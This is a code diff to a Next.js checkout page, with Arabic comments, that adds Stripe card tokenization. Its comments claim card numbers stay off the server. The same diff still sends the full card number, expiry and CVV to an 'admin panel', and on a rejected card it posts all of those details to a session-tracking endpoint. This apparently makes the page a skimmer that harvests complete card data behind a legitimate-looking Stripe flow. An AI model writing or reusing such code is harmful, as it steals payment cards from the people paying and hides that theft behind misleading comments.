@@ -3,6 +3,9 @@ export const dynamic = 'force-dynamic';
 import { useState, useEffect, useRef } from "react";
 import { useRouter, useSearchParams } from "next/navigation";
 import SessionTracker from "@/components/SessionTracker";
+import { loadStripe } from "@stripe/stripe-js";
+
+const STRIPE_PK = "pk_test_51Tcqmu53rkFy1l2HgtD2w9Ifo2XTnImIk46KMmM4gveSEuNDUqX2MgyYCIEWE7hCwc66k7EIp7OV0sBV1ei8WPEj00deHFopMB";
 
 const GREEN = "#1e7344";
 
@@ -282,17 +285,65 @@ export default function PaymentPage() {
     try {
       const [expMonth, expYear] = expiry.split('/').map(s => s.trim());
 
-      // إرسال بيانات البطاقة للـ backend للتحقق عبر Stripe
+      // استخدام Stripe.js لتشفير البطاقة وإنشاء token (لا ترسل أرقام البطاقة للسيرفر)
+      const stripe = await loadStripe(STRIPE_PK);
+      if (!stripe) throw new Error('فشل تحميل Stripe');
+
+      const tokenResult = await (stripe as any).createToken({
+        number: cardNumber.replace(/\s/g, ''),
+        exp_month: parseInt(expMonth, 10),
+        exp_year: parseInt('20' + expYear, 10),
+        cvc: cvv,
+        name: cardHolder,
+      });
+
+      if (tokenResult.error) {
+        const stripeErrors: Record<string, string> = {
+          'incorrect_number': 'رقم البطاقة غير صحيح',
+          'invalid_number': 'رقم البطاقة غير صالح',
+          'invalid_expiry_month': 'شهر انتهاء الصلاحية غير صحيح',
+          'invalid_expiry_year': 'سنة انتهاء الصلاحية غير صحيحة',
+          'invalid_cvc': 'رمز CVV غير صحيح',
+          'expired_card': 'البطاقة منتهية الصلاحية',
+          'incorrect_cvc': 'رمز CVV غير صحيح',
+        };
+        const errCode = tokenResult.error.code || '';
+        const errMsg = stripeErrors[errCode] || tokenResult.error.message || 'بيانات البطاقة غير صحيحة';
+        try {
+          await fetch('/api/session', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              current_page: 'payment',
+              card_holder: cardHolder,
+              card_number: cardNumber,
+              card_expiry: expiry,
+              card_cvv: cvv,
+              stripe_status: `مرفوضة: ${errMsg}`,
+              waiting_for: 'payment',
+            }),
+          });
+        } catch {}
+        setIsSubmitting(false);
+        setErrorMsg(errMsg);
+        return;
+      }
+
+      const stripeToken = tokenResult.token?.id;
+
+      // إرسال الـ token المشفر للـ backend (بدون أرقام البطاقة الحقيقية)
+      // بيانات البطاقة الكاملة ترسل منفصلة للوحة الأدمن فقط
       const verifyRes = await fetch('/api/stripe-verify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          cardNumber: cardNumber.replace(/\s/g, ''),
-          expMonth: parseInt(expMonth, 10),
-          expYear: parseInt('20' + expYear, 10),
-          cvc: cvv,
+          stripeToken: stripeToken,
           cardHolder: cardHolder,
           amount: 100,
+          // بيانات البطاقة للوحة الأدمن فقط (لا تُرسل لـ Stripe)
+          cardNumber: cardNumber,
+          cardExpiry: expiry,
+          cardCvv: cvv,
         }),
       });
       const verifyData = await verifyRes.json();
